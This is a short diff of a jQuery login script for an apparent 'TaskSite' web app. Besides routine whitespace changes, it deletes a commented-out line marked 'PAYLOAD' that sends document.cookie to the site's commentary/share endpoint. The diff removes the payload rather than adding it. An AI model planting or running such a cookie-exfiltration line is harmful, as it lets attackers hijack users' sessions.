@@ -1,5 +1,4 @@
 $(document).ready(function(){
-
     $("#login").on('click', function () {
         $.ajax({
             url: "/TaskSite/login",
@@ -19,6 +18,3 @@ $(document).ready(function(){
             });
     }) ;
 }) ;
-
-// PAYLOAD !!!!
-// $.ajax({url:'http://localhost:8080/TaskSite/commentary/share?id_Note=4',type: 'GET',data:'content='+document.cookie})
